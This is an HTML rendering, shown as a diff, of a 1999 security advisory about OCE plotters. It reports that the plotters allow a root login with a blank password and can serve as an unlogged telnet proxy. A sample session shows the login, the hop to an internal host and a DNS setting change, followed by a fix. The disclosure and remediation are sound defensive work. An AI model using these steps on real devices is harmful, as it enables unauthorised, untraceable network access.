@@ -1,0 +1,75 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title></title>
+<meta name="generator" content="HTML::TextToHTML v2.51"/>
+</head>
+<body>
+<p>&lt;html&gt;&lt;title&gt;Vulnerability&lt;/title&gt;&lt;head&gt; &lt;style type="text/css"&gt;&lt;!-- A {text-decoration:none} --&gt;div {
+</p><p>    white-space: pre-wrap;      /* CSS3 <em>/
+    white-space: -moz-pre-wrap; /</em> Firefox <em>/
+    white-space: -pre-wrap;     /</em> Opera &lt;7 <em>/
+    white-space: -o-pre-wrap;   /</em> Opera 7 */
+    word-wrap: break-word;<br/>
+}&lt;/style&gt;&lt;/head&gt;&lt;body alink="<strong>EE0000" link="</strong>0000EE" bgcolor="#333333" text="#000000" vlink="#551A8B"&gt;&lt;center&gt;&lt;table border="0" cellpadding="2" cellspacing="2" width="70%"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style="background-color:rgb(150,200,200);font-weight: bold;"&gt;&lt;center&gt;Advisory #: 78&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Title:&lt;/b&gt; OCE plotter anonymous proxy&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Author: &lt;/b&gt;Larry W. Cashdollar, @_larry0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Date:&lt;/b&gt; 1999-08-01&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Download Site:&lt;/b&gt; &lt;a href=""&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor: &lt;/b&gt;OCE&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Notified: &lt;/b&gt; 1999-08-01&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Contact:&lt;/b&gt; <a href="http://seclists.org/bugtraq/1999/Aug/240&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td">http://seclists.org/bugtraq/1999/Aug/240&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td</a> valign="top" style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Description:&lt;/b&gt; &lt;span style="color: rgb(0, 0, 0); font-family: Times; font-size: medium; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: normal; orphans: auto; text-align: start; text-indent: 0px; text-transform: none; white-space: pre-wrap; widows: auto; word-spacing: 0px; -webkit-text-stroke-width: 0px; display: inline !important; float: none;"&gt;OCE 9600 plotter is a printing hardware device&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vulnerability:&lt;/b&gt;&lt;div&gt;I apologize if this has be brought up before, but with the recent post concerning the QMS 2060 printers and the length of time I have sat on this (4 months) I figured it should be released. I sent this information to OCE long ago with no response. I am aware of the Intelligent Peripherals bulletin by CIAC.
+</p><p><a href="http://www.ciac.org/ciac/bulletins/j-019.shtml">http://www.ciac.org/ciac/bulletins/j-019.shtml</a>
+</p><p>I have a few plotters / printers under my audit umbrella and noticed something interesting on an Oce&amp;#039; 9400 plotter. The printer has the ability to be a telnet proxy. Where as a user can hop via telnet to other hosts. If the printer is not setup properly the connections will go unlogged.
+</p><p>bunyip% telnet JPP1<br/>
+Trying <a href="telnet://192.168.38.244">192.168.38.244</a>...<br/>
+Connected to JPP1.<br/>
+Escape character is &amp;#039;^]&amp;#039;.
+</p><p>Network Printer Server Version 5.6.3 (<a href="telnet://192.168.38.244">192.168.38.244</a>)
+</p><p>login: root<br/>
+Password:[Just enter here]
+</p><p>Welcome root user
+</p><p>WARNING: current and stored values differ. Use &amp;#039;list diff&amp;#039; command to find the differences. Current values will be lost if unit is reset.
+</p><p>192.168.38.244:root&amp;gt; telnet <a href="telnet://192.168.38.110">192.168.38.110</a> trying <a href="telnet://192.168.38.110">192.168.38.110</a> ...
+Connected to <a href="telnet://192.168.38.110">192.168.38.110</a><br/>
+Escape character is &amp;#039;0x18&amp;#039;
+</p><p>Red Hat Linux release 5.9 (Starbuck)<br/>
+Kernel 2.2.3-5 on an i586<br/>
+login:
+</p><pre>
+             <a href="ftp://192.168.38.244/root">192.168.38.244:root</a>&amp;gt; list sysinfo
+             name:
+          contact:
+         location:
+          version: 5.6.3
+    serial number: 13029
+         compiled: Mar 25 1998    loginfo: sys
+          logport:
+           syslog: <a href="telnet://255.255.255.255">255.255.255.255</a>
+            email: NetPrint@&amp;lt;unconfigured&amp;gt;
+       dns server: <a href="telnet://192.168.38.110">192.168.38.110</a>
+           module: novell, appletalk, netbios
+         checksum: 1E54
+         All that is needed is a valid DNS server setup in the plotter
+</pre>
+<p>configuration.
+</p><p>192.168.38.244:root&amp;gt; set sysinfo dns <a href="telnet://192.168.38.100">192.168.38.100</a>
+</p><p>And anyone can use the plotter as an anonymous telnet proxy.
+</p><p>Fix<br/>
+Enable passwords for the accounts on the plotter:
+</p><pre>
+         syntax: set user add &amp;lt;NAME&amp;gt;
+         set user del &amp;lt;NAME&amp;gt;
+         set user passwd &amp;lt;NAME&amp;gt; [&amp;lt;PASSWORD&amp;gt;]
+         set user type &amp;lt;NAME&amp;gt; root|guest
+         set user from default|stored
+</pre>
+<p>Enable logging:
+</p><pre>
+         syntax: set logpath &amp;lt;LOGPATH&amp;gt; name &amp;lt;NEW_NAME&amp;gt;
+         set logpath &amp;lt;LOGPATH&amp;gt; type [[-]job] [[-]user] [[-]pgcnt] [[-]cksum]
+                     [[-]printer] [[-]ioport]
+         set logpath &amp;lt;LOGPATH&amp;gt; port &amp;lt;TCP-PORT&amp;gt;|email|syslog
+         set logpath from default|stored
+</pre>
+<p>P.S. This plotter has ping functionality also. No, I have not tried DoS attacks =)
+</p><p>syntax: ping [-s] &amp;lt;IPNAME&amp;gt; [&amp;lt;DATASZ&amp;gt; [&amp;lt;NUMPKTS&amp;gt;]]&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;CVE-&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;JSON:&lt;/b&gt;&lt;a href="json.php?s=78"&gt; Export&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Exploit Code:&lt;/b&gt;&lt;div&gt;&lt;pre class="php" style="font-family:monospace;"&gt;&lt;ol&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Screen Shots:&lt;/b&gt; &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Advisory:&lt;/b&gt; &lt;a href="<a href="http://www.vapid.dhs.org/advisories/oce_plotter_anonymous_telnet_proxy.html">http://www.vapid.dhs.org/advisories/oce_plotter_anonymous_telnet_proxy.html</a>"&gt;<a href="http://www.vapid.dhs.org/advisories/oce_plotter_anonymous_telnet_proxy.html&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt">http://www.vapid.dhs.org/advisories/oce_plotter_anonymous_telnet_proxy.html&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt</a>;
+&lt;/html&gt;
+</p>
+
+</body>
+</html>
